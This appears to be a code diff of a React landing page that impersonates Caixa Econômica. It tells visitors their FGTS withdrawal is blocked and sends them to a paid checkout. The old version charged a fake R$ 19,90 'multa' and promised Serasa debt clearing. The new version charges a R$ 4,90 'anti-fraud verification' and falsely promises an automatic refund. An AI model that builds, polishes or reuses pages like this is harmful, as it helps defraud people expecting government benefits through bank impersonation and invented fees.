@@ -1,7 +1,7 @@
 import { useEffect, useState } from "react";
 import logo from "../assets/caixalogo.png";
 import { HiChevronRight } from "react-icons/hi";
-import pixIcon from "../assets/pix.png";
+import receita from "../assets/receita.png";
 import { IoIosWarning } from "react-icons/io";
 
 export function Upsell() {
@@ -28,25 +28,25 @@ export function Upsell() {
 
     const questions = [
         {
-            question: "Por que oferecer um desconto de 90%?",
-            answer: "Queremos proporcionar uma oportunidade única para que você resolva suas pendências financeiras de forma acessível. Nosso objetivo é facilitar sua vida financeira e permitir que você tenha controle sobre seu nome."
+            question: "Por que preciso passar por essa verificação?",
+            answer: "A Caixa Econômica implementa este processo para garantir a segurança de seus clientes, evitando fraudes e acessos indevidos a contas de FGTS."
         },
         {
-            question: "Como garantir que meu nome será limpo?",
-            answer: "Nosso processo é 100% seguro e feito em parceria com a SERASA. Após a confirmação do pagamento, sua situação será regularizada no sistema."
+            question: "O valor será cobrado de fato?",
+            answer: "Não. O valor de R$ 4,90 é apenas um bloqueio temporário no seu cartão e será devolvido automaticamente após a confirmação."
         },
         {
-            question: "Quais são as formas de pagamento?",
-            answer: "Você pode optar por PIX, cartões de crédito e débito para realizar o pagamento. Basta escolher a forma que mais facilita seu acesso."
+            question: "É seguro realizar esta verificação?",
+            answer: "Sim. Trabalhamos com parceiros de pagamento seguros e confiáveis para que você tenha uma experiência tranquila e livre de riscos."
         },
         {
-            question: "Quanto tempo leva para regularizar meu nome?",
-            answer: "Após o pagamento, seu nome será limpo em até 3 dias úteis. Garantimos um processo rápido e seguro para sua tranquilidade."
+            question: "Quanto tempo leva para o valor ser estornado?",
+            answer: "O valor é desbloqueado em até 24 horas após a verificação, dependendo do banco emissor do seu cartão."
         }
     ];
 
     return (
-        <div className="flex flex-col items-center w-full min-h-screen bg-white text-gray-800  pb-10">
+        <div className="flex flex-col items-center w-full min-h-screen bg-white text-gray-800 pb-10">
             {/* Cabeçalho */}
             <header className="flex items-center justify-between w-full py-4 bg-blue-800 text-white px-6">
                 <div className="flex items-center space-x-3">
@@ -58,64 +58,39 @@ export function Upsell() {
             {/* Container de Conteúdo */}
             <div className="flex flex-col items-center w-full max-w-md bg-white shadow-lg rounded-lg p-6">
                 <div className="text-center">
-                    {/* <img src={discountBadge} alt="90% Desconto" className="w-16 mx-auto" /> */}
 
-                    <div className="flex items-center justify-center pt-4 space-y-4">
-                        <IoIosWarning className="text-red-500 mr-2" size={36} />
-                        <h2 className="text-3xl font-bold text-red-500">SAQUE TRAVADO!</h2>
+                    <div className="flex items-center flex-col  justify-center pt-4 ">
+                        <IoIosWarning className="text-red-500 " size={80} />
+                        <h2 className="text-3xl font-bold text-red-500">VERIFICAÇÃO <br /> ANTI-FRAUDE</h2>
                     </div>
 
-                    <h2 className="text-3xl font-bold text-zinc-800 mt-4 mb-3">
-                        VOCÊ NÃO PODE SACAR O DINHEIRO POIS ADQUIRIU A MODALIDADE <br /> <span className="text-orange-500">SAQUE-ANIVERSÁRIO</span>
+                    <h2 className="text-2xl font-bold text-zinc-800 mt-4 mb-3">
+                        Para liberar seu saque do FGTS, precisamos fazer uma verificação de segurança.
                     </h2>
 
-
-                    <p className="text-gray-500 mt-4 text-2xl">
-                        Para poder sacar o dinheiro, você tem que pagar a <span className="text-red-600 font-bold">multa</span> de quebra de contrato.
+                    <p className="text-gray-500 mt-4 text-xl">
+                        A Caixa Econômica requer uma <span className="text-red-600 font-bold">verificação de segurança</span> com valor simbólico de <strong>R$ 4,90</strong>.
+                        <br />Esse valor será <strong className="text-green-600">devolvido</strong> automaticamente após a confirmação.
                     </p>
 
                     <button className="text-gray-500 text-lg mt-2">
-                        <img src={pixIcon} alt="Pagamentos por Pix" className="w-20 mx-auto" />
-                        DESCONTO DE <span className="">96%</span> <br />
-                        <span className="text-red-500 font-bold text-4xl">R$ 19,90</span> apenas
+                        <img src={receita} alt="Pagamentos por Pix" className="w-20 mx-auto mb-3" />
+                        VERIFICAÇÃO DE <span className="">SEGURANÇA</span> <br />
+                        <span className="text-red-500 font-bold text-4xl">R$ 4,90</span> <br /> (Esse valor será reembolsado)
                     </button>
 
                 </div>
 
                 <div className="mt-6">
-
-                </div>
-
-                <div className="mt-6">
-                    <a href="https://pay.pagamentofgt.shop/VroegNqEmKPGKwj" className="w-full">
+                    <a href="https://checkout.perfectpay.com.br/pay/PPU38CP7BKU?hidepix=1" className="w-full">
                         <button className="bg-green-500 w-full py-3 rounded-md text-white text-xl font-bold hover:bg-orange-600 focus:outline-none">
-                            PAGAR MULTA E SACAR MEU FGTS
+                            REALIZAR VERIFICAÇÃO E LIBERAR FGTS
                         </button>
                     </a>
                 </div>
-                {/* 
-                <button className="text-gray-500 text-lg mt-2">
-                    DESCONTO DE <span className="">97%</span> <br />
-                    <span className="text-green-600 font-bold text-4xl">R$ 9,90</span> apenas
-                </button>
-
-
-                <div className="mt-6">
-                    <img src={pixIcon} alt="Pagamentos por Pix" className="w-20 mx-auto" />
-                </div>
-
-                <div className="mt-6">
-                    <a href="https://pay.pagamentofgt.shop/VroegNqEmKPGKwj" className="w-full">
-                        <button className="bg-orange-500 w-full py-3 rounded-md text-white text-xl font-bold hover:bg-orange-600 focus:outline-none">
-                            Pagar no CRÉDITO e Limpar Nome
-                        </button>
-                    </a>
-                </div> */}
-
-
 
                 <p className="text-gray-500 text-sm text-center mt-4">
-                    Oferta por tempo limitado! Aproveite a condição especial e regularize sua situação financeira.
+                    Verificação rápida e segura para garantir que você é o titular do benefício. Após a confirmação, o valor será estornado e o saque estará liberado.
                 </p>
 
                 {/* FAQ Section */}
